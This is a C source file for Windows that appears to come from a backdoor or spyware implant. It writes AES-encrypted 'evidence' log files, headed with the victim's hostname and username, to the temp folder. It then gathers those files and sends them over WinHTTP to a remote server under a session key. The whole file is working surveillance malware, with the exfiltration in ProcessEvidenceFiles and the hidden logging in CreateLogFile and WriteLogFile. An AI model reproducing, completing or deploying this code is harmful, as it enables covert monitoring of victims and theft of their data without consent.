#include <Windows.h>

#include "log_files.h"
#include "binpatched_vars.h"
#include "aes_alg.h"
#include "win_http.h"
#include "proto.h"

extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];

int __cdecl compare(const void *first, const void *second)
{
	return CompareFileTime(&((PWIN32_FIND_DATA)first)->ftCreationTime, &((PWIN32_FIND_DATA)second)->ftCreationTime);
}

VOID ProcessEvidenceFiles()
{
	HANDLE hFind;
	LPWSTR pTempPath, pFindArgument;
	WIN32_FIND_DATA pFindData;
	PBYTE pCryptedBuffer;

	pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));

	pFindArgument = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	PBYTE pPrefix = (PBYTE)BACKDOOR_ID + 4;
	while(*pPrefix == L'0')
		pPrefix++;
	wsprintf(pFindArgument, L"%s\\%S*tmp", pTempPath, pPrefix);
		
	hFind = FindFirstFile(pFindArgument, &pFindData);
	if (hFind == INVALID_HANDLE_VALUE)
		return;

	ULONG x = 0;
	do
		if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;
		else
			x++;
	while (FindNextFile(hFind, &pFindData) != 0);
	FindClose(hFind);

	ULONG i=0;
	x = min(x, 1024);
	hFind = FindFirstFile(pFindArgument, &pFindData);
	PWIN32_FIND_DATA pFindDataArray = (PWIN32_FIND_DATA)malloc(sizeof(WIN32_FIND_DATA)*x);	
	do
	{
		if (pFindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			continue;

		memcpy(pFindDataArray + i, &pFindData, sizeof(WIN32_FIND_DATA));
		i++;

		if (i >= x)
			break;
	}
	while (FindNextFile(hFind, &pFindData) != 0);
	FindClose(hFind);

	qsort(pFindDataArray, i, sizeof(WIN32_FIND_DATA), compare);
	for(x=0; x<i; x++)
	{	
		// do stuff
		ULONG uFileNameLen = wcslen(pTempPath) + wcslen(pFindDataArray[x].cFileName);
		PWCHAR pFileName = (PWCHAR)malloc(uFileNameLen * sizeof(WCHAR) + 2);
		wsprintf(pFileName, L"%s\\%s", pTempPath, pFindDataArray[x].cFileName);
		
		HANDLE hFile = CreateFile(pFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if (hFile)
		{
			ULONG uFileSize = GetFileSize(hFile, NULL);
			if (uFileSize != INVALID_FILE_SIZE)
			{
				PBYTE pFileBuff = (PBYTE)malloc(uFileSize + sizeof(ULONG));
				if (pFileBuff)
				{
					ULONG uOut;
					*(PULONG)pFileBuff = uFileSize; // fize
					if (ReadFile(hFile, pFileBuff + sizeof(ULONG), uFileSize, &uOut, NULL))
					{
						WinHTTPSendData(pCryptedBuffer, CommandHash(PROTO_EVIDENCE, pFileBuff, uFileSize + sizeof(ULONG), (PBYTE)pSessionKey, &pCryptedBuffer));
						free(pCryptedBuffer);
						// FIXME read response & delete file.
					}
					free(pFileBuff);
				}
			}
			CloseHandle(hFile);
		}
	}

	free(pTempPath);
	free(pFindArgument);
}

HANDLE CreateLogFile(ULONG uEvidenceType, PBYTE pAdditionalHeader, ULONG uAdditionalLen)
{
	LPWSTR pTempPath, pFileName, pFileSuffix, pTempFileSuffix;
	FILETIME uFileTime;
	HANDLE hFile;

#ifdef _DEBUG
	LPWSTR pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] CreateLogFile, uEvidenceType: %08x, pAdditionalHeader: %08x, uAdditionalLen: %08x\n", uEvidenceType, pAdditionalHeader, uAdditionalLen);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	//TODO FIXME: check for filesystem space
	GetSystemTimeAsFileTime(&uFileTime);

	pFileName = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	pTempPath = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	pFileSuffix = pTempFileSuffix = (LPWSTR)malloc(32767 * sizeof(WCHAR));
	wsprintf(pFileSuffix, L"%S", BACKDOOR_ID + 4);
	while(*pTempFileSuffix == L'0')
		pTempFileSuffix++;

	GetEnvironmentVariable(L"TMP", pTempPath, 32767 * sizeof(WCHAR));
	do
	{
		wsprintf(pFileName, L"%s\\%s%x%x.tmp", pTempPath, pTempFileSuffix, uFileTime.dwHighDateTime, uFileTime.dwLowDateTime);
		hFile = CreateFile(pFileName, GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

		uFileTime.dwLowDateTime++;
		if (uFileTime.dwLowDateTime == 0)
			uFileTime.dwHighDateTime++;
	}
	while (hFile == INVALID_HANDLE_VALUE);
#ifdef _DEBUG
	pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] New log file %s created\n", pFileName);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	free(pTempPath);
	free(pFileSuffix);

	ULONG uFileLen, uOutLen;
	PBYTE pLogFileBuffer = CreateLogHeader(uEvidenceType, NULL, 0, &uFileLen);
	WriteFile(hFile, pLogFileBuffer, uFileLen, &uOutLen, NULL);
	free(pLogFileBuffer);

#ifdef _DEBUG
	pDebugString = (LPWSTR)malloc(4096);
	wsprintf(pDebugString, L"[+] Written %d bytes on %s\n", uFileLen, pFileName);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	free(pFileName);
	return hFile;
}

PBYTE CreateLogHeader(ULONG uEvidenceType, PBYTE pAdditionalData, ULONG uAdditionalDataLen, PULONG uOutLen)
{
	WCHAR wUserName[256];
	WCHAR wHostName[256];
	FILETIME uFileTime;
	LOG_HEADER pLogHeader;
	PLOG_HEADER pFinalLogHeader;

	if (uOutLen)
		*uOutLen = 0;

	memset(wUserName, 0x0, sizeof(wUserName));
	memset(wHostName, 0x0, sizeof(wHostName));
	wUserName[0]=L'-';
	wHostName[0]=L'-';
	GetEnvironmentVariable(L"USERNAME", (LPWSTR)wUserName, (sizeof(wUserName)/sizeof(WCHAR))-2);
	GetEnvironmentVariable(L"COMPUTERNAME", (LPWSTR)wHostName, (sizeof(wHostName)/sizeof(WCHAR))-2);
	GetSystemTimeAsFileTime(&uFileTime);

	pLogHeader.uDeviceIdLen = wcslen(wHostName) * sizeof(WCHAR);
	pLogHeader.uUserIdLen = wcslen(wUserName) * sizeof(WCHAR);
	pLogHeader.uSourceIdLen = 0;
	if (pAdditionalData)
		pLogHeader.uAdditionalData = uAdditionalDataLen;
	else
		pLogHeader.uAdditionalData = 0;
	pLogHeader.uVersion = LOG_VERSION;
	pLogHeader.uHTimestamp = uFileTime.dwHighDateTime;
	pLogHeader.uLTimestamp = uFileTime.dwLowDateTime;
	pLogHeader.uLogType = uEvidenceType;

	// calcola lunghezza paddata
	ULONG uHeaderLen = sizeof(LOG_HEADER) + pLogHeader.uDeviceIdLen + pLogHeader.uUserIdLen + pLogHeader.uSourceIdLen + pLogHeader.uAdditionalData;
	ULONG uPaddedHeaderLen = uHeaderLen;
	if (uPaddedHeaderLen % BLOCK_LEN)
		while(uPaddedHeaderLen % BLOCK_LEN)
			uPaddedHeaderLen++;

	pFinalLogHeader = (PLOG_HEADER)malloc(uPaddedHeaderLen + sizeof(ULONG));
	PBYTE pTempPtr = (PBYTE)pFinalLogHeader;

	// log size
	*(PULONG)pTempPtr = uPaddedHeaderLen;
	pTempPtr += sizeof(ULONG);

	// header
	memcpy(pTempPtr, &pLogHeader, sizeof(LOG_HEADER));
	pTempPtr += sizeof(LOG_HEADER);

	// hostname
	memcpy(pTempPtr, wHostName, pLogHeader.uDeviceIdLen);
	pTempPtr += pLogHeader.uDeviceIdLen;
	
	// username
	memcpy(pTempPtr, wUserName, pLogHeader.uUserIdLen);
	pTempPtr += pLogHeader.uUserIdLen;

	// additional data
	if (pAdditionalData)
		memcpy(pTempPtr, pAdditionalData, uAdditionalDataLen);

	// cifra l'header a parte la prima dword che e' in chiaro
	pTempPtr = (PBYTE)pFinalLogHeader;
	pTempPtr += sizeof(ULONG);

	BYTE pInitVector[16];
	aes_context crypt_ctx;

	memset(pInitVector, 0x0, sizeof(pInitVector));
	aes_set_key(&crypt_ctx, pLogKey, 128);
	aes_cbc_encrypt(&crypt_ctx, pInitVector, pTempPtr, pTempPtr, uHeaderLen);

	if (uOutLen)
		*uOutLen = uPaddedHeaderLen + sizeof(ULONG);
	
	return (PBYTE)pFinalLogHeader;
}


BOOL WriteLogFile(HANDLE hFile, PBYTE pBuffer, ULONG uBuffLen)
{
	aes_context pAesContext;
	PBYTE pInitVector[16];

	if (hFile == INVALID_HANDLE_VALUE || pBuffer == NULL || uBuffLen == 0)
		return FALSE;

	ULONG uPaddedLen = uBuffLen;
	while (uPaddedLen % 16)
		uPaddedLen++;

	// inserisce len e copia buffer originale 
	PBYTE pCryptBuff = (PBYTE)malloc(uPaddedLen + sizeof(ULONG));
	*(PULONG)pCryptBuff = uBuffLen;
	memcpy(pCryptBuff + sizeof(ULONG), pBuffer, uBuffLen);

	// cifra
	memset(pInitVector, 0x0, 16);
	aes_set_key(&pAesContext, pLogKey, 128);
	aes_cbc_encrypt(&pAesContext, (PBYTE)pInitVector, pCryptBuff+sizeof(ULONG), pCryptBuff+sizeof(ULONG), uBuffLen);
	
	// scrive
	ULONG uOut, retVal;
	retVal = WriteFile(hFile, pCryptBuff, uPaddedLen + sizeof(ULONG), &uOut, NULL);
	free(pCryptBuff);

	return retVal;
}